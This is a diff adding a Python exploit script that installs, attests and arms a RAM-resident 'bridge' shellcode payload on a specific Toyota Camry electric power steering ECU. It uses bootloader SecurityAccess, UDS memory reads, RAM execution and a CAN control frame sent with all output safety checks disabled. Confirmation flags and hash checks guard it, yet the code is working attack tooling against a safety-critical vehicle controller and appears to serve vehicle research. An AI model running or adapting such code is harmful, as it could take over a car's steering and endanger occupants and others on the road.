@@ -1,0 +1,212 @@
+#!/usr/bin/env python3
+"""Install, attest, and optionally arm the exact-F33 B6 RAM receive bridge.
+
+The runtime is an already-authenticated 4 KiB Toyota EPS RAM payload. Live mode
+uses the field-proven F33 application->bootloader handoff, boot SecurityAccess,
+and RAM execute path, then waits for the application to reappear, validates the
+v3 bridge mailbox, and requires the stock foreground tick to advance. It never
+erases/programs CodeFlash or DataFlash.
+"""
+from __future__ import annotations
+
+import argparse
+import hashlib
+import json
+import sys
+import time
+from pathlib import Path
+from typing import Any
+
+
+
+
+from exploit.common.ram_exec import (
+    ELM327_SAFETY_MODE,
+    RAM_LOAD_ADDR,
+    RamExecError,
+    _import_uds,
+    _make_uds_client,
+    _read_f181,
+    ensure_boardd_stopped,
+    execute_ram_payload,
+    explicit_ram_exec_geometry,
+    explicit_route,
+    load_security_secret,
+)
+
+EXPECTED_F181_HEX = "023839363546333330373030300000000038413331313333303331303000000000"
+EXPECTED_BOOT_F181_HEX = "02" + "21" * 32
+EXPECTED_PAYLOAD_SHA256 = "6d605013f1868295df6b998874e54f6c07ba8af2e9b839fc1243d1ac5a0126cd"
+BRIDGE_SHELLCODE_SHA256 = "be90e5caa7435c3479e0e4788302c4778a9b6c30376a8088e9ea2a45305cf278"
+MAILBOX_BASE = 0xFEBF0000
+MAILBOX_SIZE = 0x30
+MAILBOX_MAGIC = 0x42364252
+MAILBOX_VERSION = 3
+FOREGROUND_TICK = 0xFEBE39DB
+CONTROL_CAN_ID = 0x1FDC0002
+ROUTE = explicit_route(bus=0, elm327_param=1, uds_variant="old", cpu_index=0)
+GEOMETRY = explicit_ram_exec_geometry(
+    load_addr=RAM_LOAD_ADDR,
+    evidence="dynamic:camry-8965F3307000-20260826",
+)
+
+
+class BridgeInstallError(RuntimeError):
+    pass
+
+
+def _rmba(client: Any, uds_mod: Any, address: int, size: int) -> bytes:
+    if (address, size) not in ((MAILBOX_BASE, MAILBOX_SIZE), (FOREGROUND_TICK, 1)):
+        raise BridgeInstallError(f"unapproved bridge read 0x{address:08X}/{size}")
+    data = bytes((0x15, 0x01)) + address.to_bytes(4, "big") + bytes((size,))
+    raw = bytes(client._uds_request(uds_mod.SERVICE_TYPE.READ_MEMORY_BY_ADDRESS, data=data))
+    if len(raw) != size:
+        raise BridgeInstallError(f"SID23 bridge read returned {len(raw)} bytes; expected {size}")
+    return raw
+
+
+def _snapshot(client: Any, uds_mod: Any) -> dict[str, Any]:
+    raw = _rmba(client, uds_mod, MAILBOX_BASE, MAILBOX_SIZE)
+    return {
+        "raw_hex": raw.hex(),
+        "magic": f"0x{int.from_bytes(raw[0:4], 'little'):08X}",
+        "magic_ok": int.from_bytes(raw[0:4], "little") == MAILBOX_MAGIC,
+        "version": raw[4],
+        "version_ok": raw[4] == MAILBOX_VERSION,
+        "last_sequence": raw[5],
+        "running": raw[6] != 0,
+        "bridged": int.from_bytes(raw[8:12], "little"),
+        "pending": int.from_bytes(raw[12:16], "little") != 0,
+        "saved_b6_hex": raw[16:48].hex(),
+    }
+
+
+def attest_application(*, timeout: float = 8.0, tick_interval: float = 0.05,
+                       arm_bridge: bool = False) -> dict[str, Any]:
+    ensure_boardd_stopped()
+    try:
+        from panda import Panda
+    except ImportError as exc:
+        raise BridgeInstallError("panda module unavailable") from exc
+    uds_mod = _import_uds()
+    deadline = time.monotonic() + timeout
+    last_error: str | None = None
+    while time.monotonic() < deadline:
+        panda = Panda()
+        panda.set_safety_mode(ELM327_SAFETY_MODE, ROUTE.elm327_param)
+        client = _make_uds_client(panda, uds_mod, ROUTE, timeout=0.25, response_pending_timeout=1.0)
+        try:
+            f181_hex, f181_ascii = _read_f181(client, uds_mod)
+            if f181_hex is None or f181_hex.lower() != EXPECTED_F181_HEX:
+                raise BridgeInstallError(f"application F181 mismatch after RAM execute: {f181_hex}")
+            client.diagnostic_session_control(uds_mod.SESSION_TYPE.EXTENDED_DIAGNOSTIC)
+            first = _snapshot(client, uds_mod)
+            if not first["magic_ok"] or not first["version_ok"]:
+                raise BridgeInstallError(f"bridge mailbox identity mismatch: {first}")
+            tick_first = _rmba(client, uds_mod, FOREGROUND_TICK, 1)[0]
+            time.sleep(tick_interval)
+            second = _snapshot(client, uds_mod)
+            tick_second = _rmba(client, uds_mod, FOREGROUND_TICK, 1)[0]
+            if tick_second == tick_first:
+                raise BridgeInstallError(f"stock foreground tick did not advance: {tick_first}")
+            if arm_bridge:
+                try:
+                    from opendbc.car import structs
+                except ImportError as exc:
+                    raise BridgeInstallError("opendbc.car.structs unavailable") from exc
+                panda.set_safety_mode(structs.CarParams.SafetyModel.allOutput, 1)
+                sequence = (second["last_sequence"] + 1) & 0xFF
+                panda.can_send(CONTROL_CAN_ID, bytes((0x00, 0xF3, sequence, 0x20, 1, 0, 0, 0)), 0)
+                time.sleep(0.05)
+                second = _snapshot(client, uds_mod)
+                if second["last_sequence"] != sequence or not second["running"]:
+                    raise BridgeInstallError(f"bridge RUN command was not acknowledged: {second}")
+            return {
+                "f181_hex": f181_hex,
+                "f181_ascii": f181_ascii,
+                "foreground_tick_advanced": True,
+                "foreground_tick_first": tick_first,
+                "foreground_tick_second": tick_second,
+                "armed": arm_bridge,
+                "telemetry_first": first,
+                "telemetry_second": second,
+            }
+        except Exception as exc:  # noqa: BLE001 - retry app reappearance only
+            last_error = f"{type(exc).__name__}: {exc}"
+            time.sleep(0.05)
+    raise BridgeInstallError(f"bridge application attestation timed out: {last_error}")
+
+
+def plan(payload: Path) -> dict[str, Any]:
+    payload_bytes = payload.read_bytes() if payload.is_file() else b""
+    payload_sha = hashlib.sha256(payload_bytes).hexdigest() if payload_bytes else None
+    return {
+        "target": "8965F3307000",
+        "f181_hex": EXPECTED_F181_HEX,
+        "boot_f181_hex": EXPECTED_BOOT_F181_HEX,
+        "route": {"bus": 0, "tx": "0x7A1", "rx": "0x7A9", "elm327_param": 1, "uds_variant": "old"},
+        "ram": {"load_addr": f"0x{RAM_LOAD_ADDR:08X}", "size": 0x1000, "persistent_flash_writes": False},
+        "payload": {"path": str(payload), "sha256": payload_sha, "expected_sha256": EXPECTED_PAYLOAD_SHA256},
+        "bridge_shellcode_sha256": BRIDGE_SHELLCODE_SHA256,
+        "mailbox": {"base": f"0x{MAILBOX_BASE:08X}", "size": MAILBOX_SIZE,
+                    "magic": f"0x{MAILBOX_MAGIC:08X}", "version": MAILBOX_VERSION},
+        "control": {"can_id": f"0x{CONTROL_CAN_ID:08X}", "run_frame": "00 F3 seq 20 01 00 00 00"},
+        "live_requirements": ["--execute", "--nrtd-confirmed", "built-in Toyota P1M-E boot SecurityAccess root"],
+        "arm_requirements": ["--arm-bridge", "--parked-stationary-confirmed"],
+    }
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser(description=__doc__)
+    ap.add_argument("--payload", type=Path, required=True)
+    ap.add_argument("--execute", action="store_true")
+    ap.add_argument("--nrtd-confirmed", action="store_true")
+    ap.add_argument("--arm-bridge", action="store_true")
+    ap.add_argument("--parked-stationary-confirmed", action="store_true")
+    ap.add_argument("--output", type=Path)
+    args = ap.parse_args()
+
+    try:
+        p = plan(args.payload)
+        if not args.execute:
+            print(json.dumps(p, indent=2, sort_keys=True))
+            return 0
+        if not args.nrtd_confirmed:
+            raise BridgeInstallError("live RAM install requires --nrtd-confirmed")
+        if args.arm_bridge and not args.parked_stationary_confirmed:
+            raise BridgeInstallError("arming the B6 bridge requires --parked-stationary-confirmed")
+        payload = args.payload.read_bytes()
+        if len(payload) != 0x1000 or hashlib.sha256(payload).hexdigest() != EXPECTED_PAYLOAD_SHA256:
+            raise BridgeInstallError("authenticated bridge payload identity mismatch")
+        secret, _ = load_security_secret()
+        execution = execute_ram_payload(
+            payload,
+            route=ROUTE,
+            security_secret=secret,
+            timeout=0.5,
+            expected_f181_hex=EXPECTED_F181_HEX,
+            expected_boot_f181_hex=EXPECTED_BOOT_F181_HEX,
+            geometry=GEOMETRY,
+        )
+        attestation = attest_application(arm_bridge=args.arm_bridge)
+        result = {
+            "schema": "camry-f33-b6-ram-bridge-install-v3",
+            "payload_sha256": EXPECTED_PAYLOAD_SHA256,
+            "shellcode_sha256": BRIDGE_SHELLCODE_SHA256,
+            "execution": execution,
+            "attestation": attestation,
+            "secret_value_recorded": False,
+            "persistent_flash_writes": False,
+        }
+        if args.output is not None:
+            args.output.parent.mkdir(parents=True, exist_ok=True)
+            args.output.write_text(json.dumps(result, indent=2, sort_keys=True) + "\n")
+        print(json.dumps(result, indent=2, sort_keys=True))
+        return 0
+    except (BridgeInstallError, RamExecError, OSError, ValueError) as exc:
+        print(f"refusing: {exc}", file=sys.stderr)
+        return 2
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
